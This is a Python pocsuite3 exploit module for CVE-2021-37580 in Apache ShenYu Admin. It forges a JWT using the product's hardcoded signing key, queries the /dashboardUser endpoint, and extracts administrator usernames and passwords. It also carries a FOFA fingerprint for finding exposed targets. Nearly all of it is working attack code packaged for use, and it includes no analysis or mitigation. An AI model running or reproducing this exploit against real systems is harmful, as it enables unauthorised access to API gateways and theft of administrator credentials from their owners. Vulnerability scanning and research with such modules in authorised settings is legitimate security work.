"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit https://pocsuite.org
"""
import json, time
from jwt import PyJWT
from pocsuite3.lib.core.data import logger
from collections import OrderedDict
from urllib.parse import urljoin
from requests.exceptions import ReadTimeout
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptString, OptItems, OptDict, VUL_TYPE
from pocsuite3.lib.utils import get_middle_text

class DemoPOC(POCBase):
    vulID = '4'  
    author = ['PeiQi']
    name = 'Apache ShenYu dashboardUser 账号密码泄漏漏洞 CVE-2021-37580'
    vulType = VUL_TYPE.PATH_DISCLOSURE
    desc = '''Apache ShenYu Admin爆出身份验证绕过漏洞，攻击者可通过该漏洞绕过JSON Web Token (JWT)安全认证，直接进入系统后台。 Apache ShenYu 是应用于所有微服务场景的，可扩展、高性能、响应式的 API 网关解决方案。'''
    appPowerLink = 'https://github.com/apache/incubator-shenyu'
    appName = 'Apache ShenYu'
    appVersion = '未知版本'
    fofa_dork = {'fofa': 'fid="uPGDN6V9UWnc+KJdy5wdkQ=="'} 
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _options(self):
        o = OrderedDict()
        o["username"] = OptString("admin", description='UserName')
        return o

    def _generateToken(self, username):
        headers = {
            "alg": "HS256",
            "typ": "JWT"
        }
        salt = "2095132720951327"
        exp = int(time.time())
        payload = {
            "userName": username,
            "exp": exp
        }
        token = PyJWT().encode(payload=payload, key=salt,algorithm='HS256', headers=headers)
        return token

    def _verify(self):
        result = {}
        url = self.url.rstrip('/') + "/dashboardUser"
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            'X-Access-Token': self._generateToken(self.get_option("username"))
        }
        try:
            resp = requests.get(url, headers=headers, timeout=5)
            if 'userName' in resp.text and 'dataList' in resp.text and resp.status_code == 200:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['User/Pass'] = json.loads(resp.text)['data']['dataList'][0]['userName'] + "/" + json.loads(resp.text)['data']['dataList'][0]['password'] 
        except Exception as ex:
            pass

        return self.parse_output(result)
    
    def _attack(self):
        result = {}
        url = self.url.rstrip('/') + "/dashboardUser"
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            'X-Access-Token': self._generateToken(self.get_option("username"))
        }
        try:
            resp = requests.get(url, headers=headers, timeout=5)
            if 'userName' in resp.text and 'dataList' in resp.text and resp.status_code == 200:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['User/Pass'] = json.loads(resp.text)['data']['dataList'][0]['userName'] + "/" + json.loads(resp.text)['data']['dataList'][0]['password'] 
        except Exception as ex:
            pass

        return self.parse_output(result)
    
    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)